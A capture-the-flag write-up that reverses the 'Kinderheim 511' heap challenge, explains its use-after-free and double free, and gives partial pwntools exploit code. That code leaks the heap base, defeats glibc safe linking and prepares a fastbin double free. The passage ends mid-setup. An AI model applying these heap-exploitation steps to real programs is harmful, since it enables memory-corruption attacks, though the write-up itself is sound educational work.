# Kinderheim 511 - srdnlen 2025
Category: pwn

Description: Long live the expo. No wait, I mixed that one up.
## Analysis
Only one file is provided with the challenge: "k511.elf". Let's get a look at it:
```
$ file k511.elf 
k511.elf: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e2ce96d6102c2a3fc6aa7cb5c320d9bdada10977, for GNU/Linux 3.2.0, not stripped
$ checksec --file=k511.elf
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   58 Symbols	  No	0		4		k511.elf
```
This is 64 bits executable with all the usual security features enabled.

Let's run it to see how it works:
```
$ ./k511.elf 
People are such strange beings. The sad memories seem to just fade away, until all a person's left with are the happier ones.

Error reading flag env. If you see this in the CTF, call an admin.
```
Well, before calling an admin, I think we should have a look at the code itself to understand why this message is showing.
### Static analysis
I will use `ghidra` to reverse the executable.
#### `main` function
```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  int local_24;
  undefined4 local_20;
  undefined4 local_1c;
  void *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  local_18 = calloc(0x10,8);
  puts(
      "People are such strange beings. The sad memories seem to just fade away, until all a person\' s left with are the happier ones.\n"
      );
  implant_core_memory(local_18);
  while( true ) {
    while( true ) {
      while( true ) {
        while( true ) {
          puts("1) Create new memory\n2) Recollect memory\n3) Erase memory\n4) Quit.\n");
          __isoc99_scanf(&DAT_00102027,&local_24);
          getchar();
          if (local_24 != 1) break;
          implant_user_memory(local_18);
        }
        if (local_24 != 2) break;
        local_1c = collect_num(1,0x10);
        recall_memory(local_18,local_1c);
      }
      if (local_24 != 3) break;
      local_20 = collect_num(1,0x10);
      erase_memory(local_18,local_20);
    }
    if (local_24 == 4) break;
    puts("Sorry, try again.");
  }
  puts(
      "What exactly is the end? The end. The end. The end. I\'ve seen the end over and over. What is  the end?"
      );
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
The main function allocates an array of 16 elements of size 8 bytes. Then, the function `implant_core_memory`, such as an init function. And finally, a menu is displayed, and each choice is the menu has a dedicated function to operate:
- Choice 1 - Create new memory: `implant_user_memory`
- Choice 2 - Recollect memory: `recall_memory`
- Choice 3 - Erase memory: `erase_memory`
The function `collect_num` will be analyzed later.
#### `implant_core_memory` function
This is the first function called, and it takes as an argument the array created at the beginning of the program:
```c
void implant_core_memory(undefined8 param_1)

{
  char *pcVar1;
  char *pcVar2;
  
  pcVar1 = getenv("FLAG");
  if (pcVar1 == (char *)0x0) {
    printf("Error reading flag env. If you see this in the CTF, call an admin.");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar1 = (char *)malloc(0x40);
  pcVar2 = getenv("FLAG");
  snprintf(pcVar1,0x40,"%s",pcVar2);
  add_mem_to_record(param_1,pcVar1);
  puts("Core memory created.");
  return;
}
```
This function looks for the environment variable `FLAG`, allocates some memory using `malloc` to store it, and add a pointer to this memory region to the initial array (through the function `add_mem_to_record` that we will look later). If the environment variable `FLAG` is not defined, we have an error message telling us to call for an admin. Let's try to run the executable again with this variable set:
```
$ export FLAG=srdnlen{fake_flag}
$ ./k511.elf 
People are such strange beings. The sad memories seem to just fade away, until all a person's left with are the happier ones.

Memorized in slot 0.
Core memory created.
1) Create new memory
2) Recollect memory
3) Erase memory
4) Quit.
```
It seems to work better now. We can see the menu from the `main` function.
#### `add_mem_to_record` function
```c
void add_mem_to_record(long param_1,undefined8 param_2)

{
  uint local_14;
  
  local_14 = 0;
  while( true ) {
    if (0xf < (int)local_14) {
      puts("Ran out of memory.");
      return;
    }
    if (*(long *)(param_1 + (long)(int)local_14 * 8) == 0) break;
    local_14 = local_14 + 1;
  }
  *(undefined8 *)((long)(int)local_14 * 8 + param_1) = param_2;
  printf("Memorized in slot %d.\n",(ulong)local_14);
  return;
}
```
This function goes through the initial array, and, when it finds an empty slot (when the address is NULL), it adds the pointer at this location of the array and returns in a message the number of the slot. If all the slots are full, it returns an error message and returns without doing anything else.
#### `implant_user_memory` function
This function is called when the user chooses to "Create new memory" in the menu:
```c
void implant_user_memory(undefined8 param_1)

{
  uint uVar1;
  size_t sVar2;
  char *__dest;
  long in_FS_OFFSET;
  char local_218 [520];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Input your memory (max %d chars).\n",0x40);
  fgets(local_218,0x40,stdin);
  sVar2 = strnlen(local_218,0x40);
  uVar1 = (int)sVar2 - 1;
  printf("String collected. Len: %d\n",(ulong)uVar1);
  __dest = (char *)malloc((long)(int)uVar1);
  strcpy(__dest,local_218);
  if ((undefined *)(long)__dest[(int)uVar1] == &DAT_00102106) {
    __dest[(int)uVar1] = '\0';
  }
  add_mem_to_record(param_1,__dest);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
It reads the first 64 characters given by the user (or less if a `\n` is read) and stores it in a local array. Note that `fgets` adds a NULL character after at the end of the string. Then, `malloc` is called to get a memory region to store the string. Note that there is an overflow because only the size of the string minus 1 is allocated. It means that the NULL byte added by `fgets` and the potential `\n` provided by the user will overflow from the heap.

Then, it looks if the last character of the string is `\n` (corresponds to `DAT_00102106`) and replaces it by a NULL byte. The pointer to it is then stored in the first empty slot of the initial array.
#### `collect_num` function
When the user selects the choice 2 or 3 in the menu, the function `collect_num` is called first:
```c
int collect_num(char param_1,int param_2)

{
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Select the number you require.");
  __isoc99_scanf(&DAT_00102027,&local_14);
  getchar();
  if ((param_1 != '\0') && ((local_14 == 0 || (param_2 <= local_14)))) {
    puts("You cannot select that.");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return local_14;
}
```
The function asks a number to the user, and checks this number is not zero, or above 16 included. The program exits if you do not provide a valid number. Note that it accepts negative numbers.
#### `recall_memory` function
This function is called when the user selects "Recollect memory" from the menu.
```c
void recall_memory(long param_1,int param_2)

{
  long lVar1;
  int local_14;
  
  local_14 = 0;
  while( true ) {
    if (param_2 < local_14) {
      puts("Ran out of memory.");
      return;
    }
    lVar1 = *(long *)(param_1 + (long)local_14 * 8);
    if (lVar1 == 0) break;
    if (param_2 == local_14) {
      printf("Reading memory...\n\t\"%s\"",lVar1);
      return;
    }
    local_14 = local_14 + 1;
  }
  puts("There\'s a hole in your memory somewhere...");
  return;
}
```
This function goes through the initial array until the given slot is found, and prints the content of the memory. Note that the function exits when as soon as an empty slot is found. Also, we cannot ask to recall the memory of the slot 0 which contains the flag (it would be too easy).
#### `erase_memory` function
This function is called when the user chooses the item "Erase memory" from the menu:
```c
void erase_memory(long param_1,uint param_2)

{
  uint local_14;
  
  free(*(void **)(param_1 + (long)(int)param_2 * 8));
  local_14 = 0;
  while( true ) {
    if ((int)param_2 < (int)local_14) {
      puts("Ran out of memory.");
      return;
    }
    if (*(long *)(param_1 + (long)(int)local_14 * 8) == 0) break;
    if (param_2 == local_14) {
      *(undefined8 *)(param_1 + (long)(int)local_14 * 8) = 0;
      printf("Erased at slot %d",(ulong)local_14);
      return;
    }
    local_14 = local_14 + 1;
  }
  puts("There\'s a hole in your memory somewhere...");
  return;
}
```
This function frees the memory pointed by the given slot, and set to zero the pointer to this slot. Note that `free` is called at the very beginning of the function, it means that the memory pointed by the slot will be freed anyway. Also note that the function will exit as soon as an empty slot is found. It means that if the slot 1 is erased, and then the slot 2 is erased, the slot 2 will not be set to zero. It means that the slot 2 can be freed multiple times. Let's check that:
```
$ ./k511.elf 
People are such strange beings. The sad memories seem to just fade away, until all a person's left with are the happier ones.

Memorized in slot 0.
Core memory created.
1) Create new memory
2) Recollect memory
3) Erase memory
4) Quit.

1
Input your memory (max 64 chars).
slot 1
String collected. Len: 6
Memorized in slot 1.
1) Create new memory
2) Recollect memory
3) Erase memory
4) Quit.

1
Input your memory (max 64 chars).
slot 2
String collected. Len: 6
Memorized in slot 2.
1) Create new memory
2) Recollect memory
3) Erase memory
4) Quit.

3
Select the number you require.
1
Erased at slot 11) Create new memory
2) Recollect memory
3) Erase memory
4) Quit.

3
Select the number you require.
2
There's a hole in your memory somewhere...
1) Create new memory
2) Recollect memory
3) Erase memory
4) Quit.

3
Select the number you require.
2
free(): double free detected in tcache 2
Aborted
```
We have a double free!
### Memory analysis
_In all the examples from `gdb`, the memory addresses can change from one example to another._
Let's look what is happening in the heap when the program is running. I will use `gdb` with `gef` to look at the heap while debugging. Here is the state of the heap, just before to type the first entry in the menu:
```
gef➤  heap chunks
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592a0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592a0     30 93 55 55 55 55 00 00 00 00 00 00 00 00 00 00    0.UUUU..........]
Chunk(addr=0x555555559330, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559330     73 72 64 6e 6c 65 6e 7b 66 61 6b 65 5f 66 6c 61    srdnlen{fake_fla]
Chunk(addr=0x555555559380, size=0x20c90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```
There is a first chunk which is not relevant in our case (0x555555559010). I think it is allocated by the `printf` function as a buffer (not sure, to verify). The second chunk corresponds to what I called the initial array, which contains 16 slots of memory address, and the first one points to the flag which is located in the next chunk.
#### Create new memory
After adding new memory, the heap looks like this:
```
gef➤  heap chunks
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592a0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592a0     30 93 55 55 55 55 00 00 80 93 55 55 55 55 00 00    0.UUUU....UUUU..]
Chunk(addr=0x555555559330, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559330     73 72 64 6e 6c 65 6e 7b 66 61 6b 65 5f 66 6c 61    srdnlen{fake_fla]
Chunk(addr=0x555555559380, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559380     74 78 74 0a 00 00 00 00 00 00 00 00 00 00 00 00    txt.............]
Chunk(addr=0x5555555593a0, size=0x20c70, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```
There is simply a new chunk at the top of the heap which contains the data of this new memory, and the first slot of the initial array has been updated to point to this new chunk.
#### Erase memory
Then, when you erase the newly created memory, you have:
```
gef➤  heap chunks
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559010     01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592a0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592a0     30 93 55 55 55 55 00 00 00 00 00 00 00 00 00 00    0.UUUU..........]
Chunk(addr=0x555555559330, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559330     73 72 64 6e 6c 65 6e 7b 66 61 6b 65 5f 66 6c 61    srdnlen{fake_fla]
Chunk(addr=0x555555559380, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559380     59 55 55 55 05 00 00 00 03 b9 3a 6c 89 e0 6d e0    YUUU......:l..m.]
Chunk(addr=0x5555555593a0, size=0x20c70, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
gef➤  heap bins
─ Tcachebins for thread 1 ─
Tcachebins[idx=0, size=0x20, count=1] ←  Chunk(addr=0x555555559380, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
```
You can see that the slot 1 of the initial array has been set to NULL, the chunk corresponding to this slot has been modified: the first value corresponds to a pointer to the base of the heap shifted right by 12 bits (we will see later why this is important). Then, we can see the chunk has been put in the `tcachebin`.
## Exploitation
### Vulnerabilities
Let's summarize the vulnerabilities we found:
- We can read the content of a freed chunk. Indeed, because the initial array is not set to zero in some case, it means that we can continue to "Recollect memory" for this slot. As, when a chunk is freed, the first bytes correspond to a pointer to the heap, we can get an address to the heap.
- There is a double free vulnerability. It means that, if we can write to the freed chunk, we can get an arbitrary write.
### Plan
This is enough to build our attack plan:
1. Get the address to the heap. Based on this address, it will be possible to compute the address of the flag string (which is stored in the heap), and it will be possible to compute the address of any slot in the initial array.
2. Freed a slot twice and create new memory to get the freed chunk again and set the first bytes to the address of one slot in the initial array.
3. Continue to create new memory until you get the address to a slot in the initial array and write the address to the flag.
4. Recollect memory for the modified slot. We should get the flag!
I will explain more in depth each part of the plan in the exploit part.
### Security measures
There are some security measures put in place by `glibc` that will make the plan more difficult to implement.
#### Safe linking
Since `glibc 2.32`, when a chunk is freed and stored in a `fastbin` or `tcachebin`, the first bytes corresponding to the address of the next chunk in the bin are protected. It means that if you are able to read it, you won't be able to get the real address of the next chunk. Indeed, the real address has been XORed with the base pointer to the heap shifted by 12 bits to the right. It means that, if you want to decode the protected address, you also need to know the address to the base of the heap. It is possible to get the base of the heap address in the last chunk of memory in a bin. More information about safe linking [here](https://ir0nstone.gitbook.io/notes/binexp/heap/safe-linking).
#### Double free protection
If you try to do a double free in order to have a chunk twice in the `tcachebin`, it will be detected, and the program will abort. Hopefully, this security check is done only for the `tcachebin`, and not in the `fastbin`. It means that, if we want to avoid this security measure, we will need to make the `tcachebin` full (by freeing 7 chunks before).
### Exploit
I will write my exploit using `pwntools`. I have created some utility functions for this challenge:
```py
def create_memory(txt):
    conn.send(b'1\n')
    conn.recvuntil(b'\n')
    conn.send(txt)
    conn.recvuntil(b'\n\n')

def read_memory(slot):
    conn.send(b'2\n')
    conn.recvuntil(b'\n')
    conn.send(slot)
    r = conn.recvuntil(b'\n\n')
    return r.split(b'"')[1]

def erase_memory(slot):
    conn.send(b'3\n')
    conn.recvuntil(b'\n')
    conn.send(slot)
    conn.recvuntil(b'\n\n')
```
#### Get the address to the heap
We saw during the memory analysis that the address to the base of the heap is located in the last chunk in a bin. We can also get the address of any chunk in the heap by looking at any chunk in any bin. To get these addresses, we need to create the chunks, to put them in a bin, but I want to erase the slot 1 first because erasing a slot which is not the first one in the initial array has the consequence of not resetting its pointer.

Let's take an example: if I create 3 slots, then erase the slot 1, then the slot 3, then 2, the initial array will look like this:
```
gef➤  heap chunks
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559010     03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592a0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592a0     30 93 55 55 55 55 00 00 00 00 00 00 00 00 00 00    0.UUUU..........]
Chunk(addr=0x555555559330, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559330     73 72 64 6e 6c 65 6e 7b 66 61 6b 65 5f 66 6c 61    srdnlen{fake_fla]
Chunk(addr=0x555555559380, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559380     59 55 55 55 05 00 00 00 7b 94 6e 69 f0 87 fb 97    YUUU....{.ni....]
Chunk(addr=0x5555555593a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555593a0     99 c6 00 00 50 55 00 00 7b 94 6e 69 f0 87 fb 97    ....PU..{.ni....]
Chunk(addr=0x5555555593c0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555593c0     d9 c6 00 00 50 55 00 00 7b 94 6e 69 f0 87 fb 97    ....PU..{.ni....]
Chunk(addr=0x5555555593e0, size=0x20c30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
gef➤  heap bins
─ Tcachebins for thread 1 ─
Tcachebins[idx=0, size=0x20, count=3] ←  Chunk(addr=0x5555555593a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555593c0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x555555559380, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
gef➤  x/16gx 0x5555555592a0
0x5555555592a0:	0x0000555555559330	0x0000000000000000
0x5555555592b0:	0x00005555555593a0	0x00005555555593c0
0x5555555592c0:	0x0000000000000000	0x0000000000000000
0x5555555592d0:	0x0000000000000000	0x0000000000000000
0x5555555592e0:	0x0000000000000000	0x0000000000000000
0x5555555592f0:	0x0000000000000000	0x0000000000000000
0x555555559300:	0x0000000000000000	0x0000000000000000
0x555555559310:	0x0000000000000000	0x0000000000000000
```
First, we can see that the three chunks we allocated are in the bin. Moreover, the chunk at the bottom of the bin has a pointer to the base of the heap, and the other points to the other chunks in the heap. Finally, we can see that the initial array still contains the pointer to the chunks while these chunks have been freed. Therefore, if we set a new memory in the slot one, we will be able to get the address of the base of the heap (in the slot 3).

However, we would like to get the address to the base of the heap, and an address to a chunk in the heap, at the same time. Also, it would be nice if all these chunks were stored in the `fastbin` instead of the `tcachebin` to prepare the double free (which can be done in the `tcachelist`). For that, I will create 7 chunks that I will erase directly to fill the `tcachebin`, and I will make the same procedure as above to get the pointers. It gives me this code:
```py
r = conn.recvuntil(b'Quit.\n\n')

for i in range(9):
    create_memory(b'txt\n')

erase_memory(b'9\n')
erase_memory(b'8\n')
erase_memory(b'7\n')
erase_memory(b'6\n')
erase_memory(b'5\n')
erase_memory(b'1\n')
erase_memory(b'3\n')
erase_memory(b'4\n')
erase_memory(b'2\n')

create_memory(b'txt\n')

conn.interactive()
```
After running this part of the exploit, the heap looks like this:
```
gef➤  heap chunks
Chunk(addr=0x55deb089f010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055deb089f010     06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55deb089f2a0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055deb089f2a0     30 f3 89 b0 de 55 00 00 c0 f3 89 b0 de 55 00 00    0....U.......U..]
Chunk(addr=0x55deb089f330, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055deb089f330     73 72 64 6e 6c 65 6e 7b 66 61 6b 65 5f 66 6c 61    srdnlen{fake_fla]
Chunk(addr=0x55deb089f380, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055deb089f380     9f fc 62 ed db 55 00 00 26 93 df df 63 ce 28 b1    ..b..U..&...c.(.]
Chunk(addr=0x55deb089f3a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055deb089f3a0     4f fb 62 ed db 55 00 00 00 00 00 00 00 00 00 00    O.b..U..........]
Chunk(addr=0x55deb089f3c0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055deb089f3c0     74 78 74 0a 00 55 00 00 00 00 00 00 00 00 00 00    txt..U..........]
Chunk(addr=0x55deb089f3e0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055deb089f3e0     9f 08 eb 5d 05 00 00 00 00 00 00 00 00 00 00 00    ...]............]
Chunk(addr=0x55deb089f400, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055deb089f400     bf fc 62 ed db 55 00 00 26 93 df df 63 ce 28 b1    ..b..U..&...c.(.]
Chunk(addr=0x55deb089f420, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055deb089f420     df fc 62 ed db 55 00 00 26 93 df df 63 ce 28 b1    ..b..U..&...c.(.]
Chunk(addr=0x55deb089f440, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055deb089f440     ff fc 62 ed db 55 00 00 26 93 df df 63 ce 28 b1    ..b..U..&...c.(.]
Chunk(addr=0x55deb089f460, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055deb089f460     1f fc 62 ed db 55 00 00 26 93 df df 63 ce 28 b1    ..b..U..&...c.(.]
Chunk(addr=0x55deb089f480, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055deb089f480     9f 08 eb 5d 05 00 00 00 26 93 df df 63 ce 28 b1    ...]....&...c.(.]
Chunk(addr=0x55deb089f4a0, size=0x20b70, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
gef➤  heap bins
─ Tcachebins for thread 1 ─
Tcachebins[idx=0, size=0x20, count=6] ←  Chunk(addr=0x55deb089f380, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x55deb089f400, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x55deb089f420, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x55deb089f440, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x55deb089f460, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x55deb089f480, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
─ Fastbins for arena at 0x7ff01a133c60 ─
Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x55deb089f3a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x55deb089f3e0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
gef➤  x/16gx 0x000055deb089f2a0
0x55deb089f2a0:	0x000055deb089f330	0x000055deb089f3c0
0x55deb089f2b0:	0x000055deb089f3a0	0x000055deb089f3c0
0x55deb089f2c0:	0x000055deb089f3e0	0x0000000000000000
0x55deb089f2d0:	0x0000000000000000	0x0000000000000000
0x55deb089f2e0:	0x0000000000000000	0x0000000000000000
0x55deb089f2f0:	0x0000000000000000	0x0000000000000000
0x55deb089f300:	0x0000000000000000	0x0000000000000000
0x55deb089f310:	0x0000000000000000	0x0000000000000000
```
We can see that we created a lot of chunks that are now in the `tcachebin`. Then, we can see that the two chunks in the `fastbin` are available through the slot 2 (to get one address in the heap), and slot 4 to get the address to the base of the heap. When you have these both data, you can get the real address to the heap by doing a XOR operation between the two data:
```py
a4 = read_memory(b'4\n') # Get the base address
a2 = read_memory(b'2\n') # Get a protected address to the heap

# Perform XOR operation to get the real address to the heap
base_address = bytes(reversed(a4)).hex()
protected_address = bytes(reversed(a2)).hex()
unprotected_address = hex(int(base_address, 16) ^ int(protected_address, 16))[2:]
print("Protected = 0x" + protected_address)
print("Unprotected = 0x" + unprotected_address)
```
By running this, you will get these addresses:
```
Protected = 0x55c8579677bc
Unprotected = 0x55cd0b46c3d0
```
And you can look at `gdb` to see where it points:
```
gef➤  heap chunks
Chunk(addr=0x55cd0b46c010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055cd0b46c010     06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55cd0b46c2a0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055cd0b46c2a0     30 c3 46 0b cd 55 00 00 c0 c3 46 0b cd 55 00 00    0.F..U....F..U..]
Chunk(addr=0x55cd0b46c330, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055cd0b46c330     73 72 64 6e 6c 65 6e 7b 66 61 6b 65 5f 66 6c 61    srdnlen{fake_fla]
Chunk(addr=0x55cd0b46c380, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055cd0b46c380     6c 70 96 57 c8 55 00 00 e2 e7 c2 d0 ab d9 8f b3    lp.W.U..........]
Chunk(addr=0x55cd0b46c3a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055cd0b46c3a0     bc 77 96 57 c8 55 00 00 00 00 00 00 00 00 00 00    .w.W.U..........]
Chunk(addr=0x55cd0b46c3c0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055cd0b46c3c0     74 78 74 0a 00 55 00 00 00 00 00 00 00 00 00 00    txt..U..........]
Chunk(addr=0x55cd0b46c3e0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055cd0b46c3e0     6c b4 d0 5c 05 00 00 00 00 00 00 00 00 00 00 00    l..\............]
Chunk(addr=0x55cd0b46c400, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055cd0b46c400     4c 70 96 57 c8 55 00 00 e2 e7 c2 d0 ab d9 8f b3    Lp.W.U..........]
Chunk(addr=0x55cd0b46c420, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055cd0b46c420     2c 70 96 57 c8 55 00 00 e2 e7 c2 d0 ab d9 8f b3    ,p.W.U..........]
Chunk(addr=0x55cd0b46c440, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055cd0b46c440     0c 70 96 57 c8 55 00 00 e2 e7 c2 d0 ab d9 8f b3    .p.W.U..........]
Chunk(addr=0x55cd0b46c460, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055cd0b46c460     ec 70 96 57 c8 55 00 00 e2 e7 c2 d0 ab d9 8f b3    .p.W.U..........]
Chunk(addr=0x55cd0b46c480, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x000055cd0b46c480     6c b4 d0 5c 05 00 00 00 e2 e7 c2 d0 ab d9 8f b3    l..\............]
Chunk(addr=0x55cd0b46c4a0, size=0x20b70, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```
It points somewhere between two chunks. But the most important is that we can calculate the offset between this pointer, and the pointer to the flag located which is `0x000055cd0b46c330`:
```py
>>> 0x55cd0b46c3d0 - 0x000055cd0b46c330
160
```
There is an offset of 160 bytes, so we can get the address to the flag:
```py
flag_address = hex(int(unprotected_address, 16) - 160)[2:]
print("Flag = 0x" + flag_address)
```
Also, as we want to access to this flag, we need to write at the location of one of the slot. We can compute the address of the slot 0 the same way as before, and we can see there is an offset of 306:
```py
slot_zero_address = hex(int(unprotected_address, 16)-304)[2:]
print("Slot 0 address = 0x" + slot_zero_address)
```
Because we will want to get a pointer to this address using `malloc`, we can already compute the protected address to this slot:
```py
protected_slot_zero_address = hex(int(base_address, 16) ^ int(slot_zero_address, 16))[2:]
print("Slot 0 protected address = 0x" + protected_slot_zero_address)
```
We are now ready to exploit the double free vulnerability.
#### Double free setup
By exploiting the double free, we can make a chunk appearing twice in the heap. Let's look at the current heap:
```
gef➤  heap bins
[...]
─ Fastbins for arena at 0x7fe8af084c60 ─
Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x562d5537f3a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x562d5537f3e0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 

gef➤  x/16gx 0x0000562d5537f2a0
0x562d5537f2a0:	0x0000562d5537f330	0x0000562d5537f3c0
0x562d5537f2b0:	0x0000562d5537f3a0	0x0000562d5537f3c0
0x562d5537f2c0:	0x0000562d5537f3e0	0x0000000000000000
0x562d5537f2d0:	0x0000000000000000	0x0000000000000000
0x562d5537f2e0:	0x0000000000000000	0x0000000000000000
0x562d5537f2f0:	0x0000000000000000	0x0000000000000000
0x562d5537f300:	0x0000000000000000	0x0000000000000000
0x562d5537f310:	0x0000000000000000	0x0000000000000000
```
We can see that the address of the slot 4 is the last element of the bin. We would like to free it again. However, if we free it directly, it will reset its address in the initial array. So we need to erase a previous slot before:
```py
erase_memory(b'1\n')
erase_memory(b'4\n')
```
Let's now look at the heap:
```
gef➤  heap bins
─ Fastbins for arena at 0x7f11e8acfc60 ─
